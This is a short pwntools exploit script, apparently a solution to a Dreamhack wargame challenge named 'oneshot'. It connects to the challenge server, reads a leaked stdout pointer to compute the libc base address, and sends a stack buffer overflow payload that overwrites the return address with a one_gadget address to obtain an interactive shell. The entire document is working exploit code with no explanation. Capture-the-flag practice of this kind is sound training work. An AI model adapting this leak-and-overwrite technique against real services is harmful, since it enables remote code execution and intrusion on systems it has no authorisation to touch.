from pwn import *

#p = process('./oneshot')
p = remote('host3.dreamhack.games', 15002)
libc = ELF('./libc.so.6')
e = ELF('./oneshot')
context.log_level='debug'

stdout_addr = int(p.recvline()[-13:-1].strip().decode(), 16)
print(stdout_addr)

stdout_offset = 0x3c5620
#oneshot_offset = 0xebd38  #/lib ~~
oneshot_offset =0x45216

libc_base = stdout_addr - libc.symbols["_IO_2_1_stdout_"]
oneshot = libc_base + oneshot_offset

payload = b'A' * 24
payload += p64(0)
payload += b'B' * 8
payload += p64(oneshot)
p.sendafter(b"MSG: ", payload)

p.interactive()

